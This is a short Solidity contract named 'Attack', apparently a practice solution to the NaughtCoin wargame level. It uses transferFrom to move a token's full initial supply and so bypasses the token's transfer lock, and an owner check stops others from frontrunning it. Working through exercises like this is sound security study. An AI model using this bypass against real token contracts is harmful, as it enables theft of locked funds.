// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// import "./NaughtCoin.sol";

contract Attack {
    // NaughtCoin public naughtCoinToken;
    IERC20 naughtToken;
    address public owner;
    uint256 public INITIAL_SUPPLY = 1000000 * (10 ** 18);

    constructor(address _naughtCoinn) {
        naughtToken = IERC20(_naughtCoinn); // may not need this
        owner = msg.sender;
    }

    function contractWithdrawTokens() external onlyOwner {
        require(
            naughtToken.transferFrom(msg.sender, address(this), INITIAL_SUPPLY),
            "transferFrom unsuccessful"
        );
    }

    // Just practice but it's also so that I can be the only one to commit this exploit. Prevent frontrunning
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner of the attack contract");
        _;
    }
}
